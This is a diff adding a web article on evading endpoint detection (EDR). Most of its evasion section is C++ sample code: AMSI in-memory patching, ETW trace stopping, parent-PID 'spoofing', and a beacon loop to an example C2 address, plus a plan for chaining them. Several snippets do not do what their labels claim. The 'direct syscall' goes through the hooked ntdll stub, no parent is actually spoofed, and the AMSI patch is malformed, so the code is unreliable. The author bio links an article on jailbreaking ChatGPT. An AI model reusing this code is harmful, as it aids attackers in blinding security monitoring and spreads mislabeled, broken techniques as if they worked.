@@ -1,0 +1,328 @@
+---
+import ArticleLayout from '../../../layouts/ArticleLayout.astro';
+---
+
+<ArticleLayout
+  title="Evading Endpoint Detection and Response (EDR)"
+  description="Technical analysis of EDR evasion techniques. Understanding how attackers bypass endpoint security and how to improve detection."
+  date="2025-01-16"
+  canonical="https://snailsploit.com/security-research/general/edr-evasion-techniques"
+  keywords={['EDR evasion', 'endpoint security bypass', 'detection evasion', 'red team techniques']}
+  category="security-research"
+  tags={['EDR', 'evasion', 'red-team', 'endpoint-security']}
+>
+
+<h3>Evading Endpoint Detection and Response (EDR)</h3>
+
+<p>Endpoint Detection and Response (EDR) solutions have become indispensable in modern cybersecurity strategies. By gathering extensive telemetry at the host level — such as processes spawned, registry changes, and network connections — EDRs empower security teams to quickly detect and respond to threats. However, no system is foolproof.</p>
+
+<p>As attackers and red teams aim to stay unnoticed, they've mastered a broad spectrum of <strong>evasion techniques</strong> that exploit design gaps, user-mode and kernel-mode hooking limitations, and even advanced OS security features like AMSI (Antimalware Scan Interface) and ETW (Event Tracing for Windows). This guide walks you through:</p>
+
+<ul>
+  <li><strong>Windows core files</strong> that EDRs rely on for monitoring.</li>
+  <li><strong>Key elements</strong> of EDR architecture and how detection decisions are made.</li>
+  <li><strong>Hands-on evasion methods</strong>, complete with sample code for educational and ethical use.</li>
+  <li><strong>Defensive strategies</strong> to detect, mitigate, or outright prevent these bypass tactics.</li>
+  <li><strong>Emerging trends</strong> in EDR and possible future vectors of evasion.</li>
+</ul>
+
+<p>Whether you're a red team professional, a security analyst, or just curious about how adversaries outsmart defenses, this article will equip you with in-depth insights.</p>
+
+<h3>Key Windows Core Files in EDR Monitoring</h3>
+
+<p>EDRs rely on tapping into specific Windows components that handle process management, memory allocation, and security. Here are the usual focal points:</p>
+
+<h3>ntdll.dll</h3>
+
+<ul>
+  <li><strong>Function</strong>: Serves as the translator between user-mode apps and the Windows kernel, handling low-level system calls like <code>NtCreateProcess</code>, <code>NtAllocateVirtualMemory</code>, etc.</li>
+  <li><strong>Relevance</strong>: EDR hooks or monitors these calls to detect suspicious operations (e.g., injection). If attackers bypass hooking in <em>ntdll.dll</em>, the EDR may lose visibility.</li>
+</ul>
+
+<h3>kernel32.dll</h3>
+
+<ul>
+  <li><strong>Function</strong>: Offers a higher-level API for Windows operations (e.g., process/thread creation, file I/O).</li>
+  <li><strong>Relevance</strong>: Hooking or scanning calls within <em>kernel32.dll</em> helps EDRs link malicious file writes, suspicious process spawns, and so on.</li>
+</ul>
+
+<h3>advapi32.dll</h3>
+
+<ul>
+  <li><strong>Function</strong>: Central to Windows security (managing the registry, services, user privileges).</li>
+  <li><strong>Relevance</strong>: Attackers often target <em>advapi32.dll</em> for privilege escalation or registry-based persistence. EDRs monitor these interactions to spot tampering.</li>
+</ul>
+
+<h3>ntoskrnl.exe (Windows Kernel)</h3>
+
+<ul>
+  <li><strong>Function</strong>: The kernel orchestrates system resources, memory, and device drivers.</li>
+  <li><strong>Relevance</strong>: Many advanced EDRs place hooks or filters at the kernel level. Kernel exploits or rootkits strive to modify <code>ntoskrnl.exe</code> structures to dodge EDR alerts.</li>
+</ul>
+
+<h3>win32k.sys</h3>
+
+<ul>
+  <li><strong>Function</strong>: Manages user-mode interactions with the GUI, handling graphics rendering and I/O.</li>
+  <li><strong>Relevance</strong>: Attackers can hide malicious processes or circumvent user-mode monitors by manipulating calls within <code>win32k.sys</code>.</li>
+</ul>
+
+<h3>EDR Architecture & Detection Strategies</h3>
+
+<p>Most EDR solutions have several moving parts:</p>
+
+<p><strong>Agent on the Endpoint</strong></p>
+
+<ul>
+  <li><strong>Local Sensors</strong>: These often include user-mode hooks (DLL function hooking) and kernel-mode drivers (like minifilter drivers) to watch for suspicious events.</li>
+  <li><strong>Initial Detection</strong>: Some checks and blocks happen instantly on the endpoint — like known hash detection or simple behavior rules (e.g., an unexpected process writing to <code>lsass.exe</code>).</li>
+</ul>
+
+<p><strong>Centralized Analysis</strong></p>
+
+<ul>
+  <li><strong>Telemetry Aggregation</strong>: The agent ships logs and event data to a central console or cloud service.</li>
+  <li><strong>Advanced Detection Logic</strong>: Correlates patterns across multiple endpoints, uses machine learning or heuristics, and references threat intelligence feeds.</li>
+</ul>
+
+<p><strong>Response & Investigation</strong></p>
+
+<ul>
+  <li><strong>Automatic Containment</strong>: If certain rules trigger, the EDR can kill processes, isolate the endpoint, or quarantine binaries.</li>
+  <li><strong>Forensics</strong>: Security analysts can retrieve memory captures, timelines, and event histories to piece together how an attacker gained a foothold.</li>
+</ul>
+
+<h3>Practical EDR Bypassing Techniques</h3>
+
+<p>Now, let's discuss strategies for evading EDR detection. <strong>Important</strong>: These examples and snippets are intended <strong>solely</strong> for <strong>ethical and authorized testing</strong> in environments where you have explicit permission.</p>
+
+<h4>Function Hooking Bypass with Direct System Calls</h4>
+
+<p><strong>The Challenge</strong>: EDR hooks user-mode APIs in DLLs like <em>ntdll.dll</em> or <em>kernel32.dll</em>.<br>
+<strong>The Trick</strong>: Directly issue syscalls, bypassing the user-mode stubs. EDR hooking often lives in user-mode functions, but direct syscalls go straight to the kernel.</p>
+
+<pre><code>{`#include <Windows.h>
+#include <iostream>
+
+typedef NTSTATUS (WINAPI* pNtAllocateVirtualMemory)(
+    HANDLE, PVOID*, ULONG, PULONG, ULONG, ULONG
+);
+
+int main() {
+    // Obtain pointer to NtAllocateVirtualMemory (system call)
+    HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
+    pNtAllocateVirtualMemory NtAllocateMemory =
+        (pNtAllocateVirtualMemory)GetProcAddress(hNtDll, "NtAllocateVirtualMemory");
+
+    PVOID pMemory = NULL;
+    ULONG size = 0x2000; // 8 KB
+    NTSTATUS status = NtAllocateMemory(GetCurrentProcess(), &pMemory, 0, &size,
+                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    if (status == 0) {
+        std::cout << "[+] Memory allocated via direct syscall (hook bypass)." << std::endl;
+    }
+    return 0;
+}`}</code></pre>
+
+<h4>Process Creation and Thread Monitoring Evasion</h4>
+
+<p>EDRs watch for suspicious child processes (e.g., <code>powershell.exe</code> spawned by <code>winword.exe</code>).<br>
+<strong>The Trick</strong>: Spoof your parent process ID (PPID) or mutate command lines so the real origin is blurred. Some detection logic heavily relies on "If parent is X, check child's process name." Spoofing can trick these rules.</p>
+
+<pre><code>{`#include <Windows.h>
+#include <TlHelp32.h>
+#include <iostream>
+
+DWORD GetParentPID(DWORD pid) {
+    PROCESSENTRY32 pe32;
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    if (Process32First(snap, &pe32)) {
+        do {
+            if (pe32.th32ProcessID == pid) {
+                CloseHandle(snap);
+                return pe32.th32ParentProcessID;
+            }
+        } while (Process32Next(snap, &pe32));
+    }
+    CloseHandle(snap);
+    return 0;
+}
+
+void SpoofParentAndSpawn() {
+    DWORD currentPID = GetCurrentProcessId();
+    DWORD parentPID = GetParentPID(currentPID);
+
+    STARTUPINFO si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+
+    // Launch "malicious.exe" but mimic a trusted parent relationship
+    if (CreateProcess(L"malicious.exe", NULL, NULL, NULL, FALSE,
+                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        std::cout << "[+] New process spawned with a spoofed parent PID!" << std::endl;
+    }
+}
+
+int main() {
+    SpoofParentAndSpawn();
+    return 0;
+}`}</code></pre>
+
+<h4>Network Traffic Evasion Techniques</h4>
+
+<p>EDR and network monitoring solutions track unusual outbound traffic, especially if it's frequent or connects to shady domains.<br>
+<strong>The Trick</strong>: Use slow beaconing, domain fronting, or recognized ports/protocols (like HTTPS on port 443) to blend in with normal enterprise traffic. Security teams often rely on detection rules for rapid or large-scale exfil. A slow drip can escape these triggers.</p>
+
+<pre><code>{`#include <WinSock2.h>
+#include <iostream>
+#pragma comment(lib, "ws2_32.lib")
+
+void SlowBeacon() {
+    WSADATA wsaData;
+    WSAStartup(MAKEWORD(2,2), &wsaData);
+    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    sockaddr_in srv = {0};
+    srv.sin_family = AF_INET;
+    srv.sin_port = htons(443); // Common HTTPS port
+    srv.sin_addr.s_addr = inet_addr("203.0.113.5"); // Example C2
+    connect(s, (sockaddr*)&srv, sizeof(srv));
+    // Send periodic "beacons"
+    while(true) {
+        send(s, "HELLO", 5, 0);
+        Sleep(120000); // 2 minutes between calls
+    }
+    closesocket(s);
+    WSACleanup();
+}
+int main() {
+    SlowBeacon();
+    return 0;
+}`}</code></pre>
+
+<h4>AMSI Bypass Techniques</h4>
+
+<p>AMSI scans scripts (PowerShell, VBScript, etc.) and memory buffers for malicious signatures.<br>
+<strong>The Trick</strong>: Patch <code>amsi.dll</code> in memory or alter how scripts are presented (obfuscation). Once patched, AMSI's detection routine always reports content as harmless.</p>
+
+<pre><code>{`#include <Windows.h>
+#include <psapi.h>
+#include <iostream>
+
+typedef HRESULT (WINAPI *AmsiScanBuffer_t)(PVOID, ULONG, LPCWSTR, PVOID);
+AmsiScanBuffer_t origAmsiScanBuffer = NULL;
+
+HRESULT WINAPI HookedAmsiScanBuffer(PVOID buffer, ULONG length,
+                                    LPCWSTR contentName, PVOID context) {
+    // Always say "Safe!"
+    return S_OK;
+}
+
+void PatchAMSI() {
+    HMODULE amsiDLL = GetModuleHandle(L"amsi.dll");
+    if (!amsiDLL) {
+        std::cout << "[-] amsi.dll not found." << std::endl;
+        return;
+    }
+    origAmsiScanBuffer = (AmsiScanBuffer_t)GetProcAddress(amsiDLL, "AmsiScanBuffer");
+    if (!origAmsiScanBuffer) {
+        std::cout << "[-] AmsiScanBuffer not found." << std::endl;
+        return;
+    }
+
+    DWORD oldProtect;
+    VirtualProtect(origAmsiScanBuffer, 8, PAGE_EXECUTE_READWRITE, &oldProtect);
+    memcpy(origAmsiScanBuffer, &HookedAmsiScanBuffer, 8);
+    VirtualProtect(origAmsiScanBuffer, 8, oldProtect, &oldProtect);
+
+    std::cout << "[+] AMSI patched successfully." << std::endl;
+}
+
+int main() {
+    PatchAMSI();
+    // Any AMSI-based scanning now returns clean
+    return 0;
+}`}</code></pre>
+
+<h4>Event Tracing for Windows (ETW) Evasion</h4>
+
+<p><strong>The Challenge</strong>: EDRs rely on ETW for real-time logging of process events, file I/O, registry actions, and more.<br>
+<strong>The Trick</strong>: Disable or spoof ETW providers so the EDR sees nothing. If the EDR depends solely on that ETW feed, cutting it off blinds the solution to local events.</p>
+
+<pre><code>{`#include <Windows.h>
+#include <evntrace.h>
+#include <iostream>
+
+void DisableETWProvider() {
+    EVENT_TRACE_PROPERTIES props = {0};
+    props.Wnode.BufferSize = sizeof(props);
+
+    // Attempt to stop a known ETW provider
+    ULONG status = StopTraceW(NULL, L"MyProvider", &props);
+    if (status == ERROR_SUCCESS) {
+        std::cout << "[+] ETW provider stopped successfully." << std::endl;
+    } else {
+        std::cout << "[-] Failed to stop ETW provider. Error code: " << status << std::endl;
+    }
+}
+
+int main() {
+    DisableETWProvider();
+    return 0;
+}`}</code></pre>
+
+<h4>Combining Multiple Evasion Methods</h4>
+
+<p>IRL attackers will often <strong>chain</strong> these tactics:</p>
+
+<ol>
+  <li><strong>Obfuscate</strong> initial PowerShell script (bypassing AMSI).</li>
+  <li><strong>Use direct syscalls</strong> for injection (bypassing user-mode hooks).</li>
+  <li><strong>Spoof</strong> parent process for stealth.</li>
+  <li><strong>Disable ETW</strong> if possible for deeper cover.</li>
+  <li><strong>Slowly beacon</strong> to a remote server, riding normal HTTPS traffic.</li>
+</ol>
+
+<p>This synergy can degrade EDR visibility from multiple angles, resembling real-world advanced persistent threat (APT) behavior.</p>
+
+<h4>References and MITRE ATT&CK Mapping</h4>
+
+<ul>
+  <li><strong>T1055 — Process Injection</strong>: Methods like direct syscalls, DLL injection, hooking bypasses.</li>
+  <li><strong>T1562.001 — Disable or Modify Tools (AMSI/ETW)</strong>: Techniques for neutralizing built-in detection features.</li>
+  <li><strong>T1027 — Obfuscated Files or Information</strong>: Encoded or encrypted scripts, staging to avoid scanning.</li>
+  <li><strong>T1599 — Network Boundary Bridging</strong>: Evasion over well-known ports or domain fronting.</li>
+</ul>
+
+<p><strong>Additional Resources</strong></p>
+
+<ul>
+  <li><a href="https://github.com/microsoft/Detours" rel="noopener" target="_blank">Microsoft Detours</a> — A commonly cited hooking library demonstrating how user-mode API hooking works.</li>
+  <li><a href="https://learn.microsoft.com/en-us/sysinternals/" rel="noopener" target="_blank">Sysinternals Suite</a> — Tools like <strong>Sysmon</strong> and <strong>Process Monitor</strong> can reveal hooking or injection artifacts.</li>
+  <li><a href="https://www.volatilityfoundation.org/" rel="noopener" target="_blank">Volatility / Rekall</a> — Memory forensic frameworks for deeper offline analysis.</li>
+</ul>
+
+<h3>To Sum it up</h3>
+
+<p>While EDR systems represent a significant leap forward in endpoint security, determined attackers — equipped with sufficient knowledge of Windows internals — can still evade detection. From <strong>direct syscalls</strong> that circumvent user-mode hooks to <strong>AMSI</strong> or <strong>ETW</strong> tampering, these techniques exploit blind spots in how EDR solutions monitor system activity.</p>
+
+<p>For <strong>red teams</strong>, these tactics provide a realistic model of advanced adversaries. Embracing them in controlled scenarios helps identify genuine gaps and push defenses to improve. For <strong>blue teams</strong>, knowing these methods firsthand fosters a proactive mindset — watching for anomalies, layering detection sources, and ensuring the EDR is configured to catch subtle signals an attacker might leave behind.</p>
+
+<p>Ultimately, <strong>collaboration</strong> between offensive and defensive teams is the engine of progress in this cat-and-mouse game. By continually evolving detection strategies, harnessing multi-source telemetry, and rigorously testing in red-team exercises, organizations can significantly reduce the success window for adversaries. Remember: the first step to defeating any tactic is understanding it — and hopefully, this guide shines a light on the many facets of EDR evasion.</p>
+
+<h3>About the Author</h3>
+
+<p><a href="https://www.linkedin.com/in/kaiaizen/" rel="noopener" target="_blank">Kai Aizen</a>, a cybersecurity researcher and red team expert, explores the intersection of AI vulnerabilities and adversarial techniques. As part of the <strong>PTSnails</strong> team, Kai conducts cutting-edge research into the risks and challenges of AI-driven systems.</p>
+
+<ul>
+  <li><strong>GitHub</strong>: <a href="https://github.com/SnailSploit" rel="noopener" target="_blank">SnailSploit</a></li>
+  <li><strong>More Publications</strong>:</li>
+  <li>"The Hidden Risks of AI: An Offensive Perspective"</li>
+  <li>"<a href="https://hakin9.org/weaponization-in-the-cloud-unmasking-the-threats-and-tools/" rel="noopener" target="_blank">Weaponization in the Cloud: Unmasking the Threats and Tools</a>"</li>
+  <li>"<a href="https://pentestmag.com/design-your-penetration-testing-setup/" rel="noopener" target="_blank">Design Your Penetration Testing Setup</a>"</li>
+  <li>"<a href="https://zensploit.medium.com/how-i-jailbreaked-the-latest-chatgpt-model-using-context-and-social-awareness-techniques-1ca9af02eba9" rel="noopener" target="_blank">How I Jailbreaked the Latest ChatGPT Model Using Context and Social Engineering Techniques</a>"</li>
+  <li><a href="https://zensploit.medium.com/is-ai-inherently-vulnerable-bfc81caf0c52" rel="noopener" target="_blank">"Is AI Inherently Vulnerable?"</a></li>
+</ul>
+
+</ArticleLayout>
